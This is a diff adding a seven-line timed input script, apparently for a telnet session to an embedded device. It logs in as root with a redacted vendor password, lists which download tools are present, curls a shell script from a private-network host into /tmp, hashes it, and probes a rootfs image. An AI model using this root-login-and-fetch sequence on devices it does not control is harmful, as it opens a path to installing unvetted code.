@@ -1,0 +1,7 @@
+1000|root
+3000|<redacted:vendor telnet password>
+9000|
+12000|echo G1; which curl wget tftp
+18000|echo G2; curl -sf -o /tmp/probe http://192.168.5.5:8000/poll.sh; echo RC=$?; ls -l /tmp/probe
+30000|echo G3; busybox sha256sum /tmp/probe 2>&1
+36000|echo G4; curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' http://192.168.5.5:8000/t-rootfs.bin
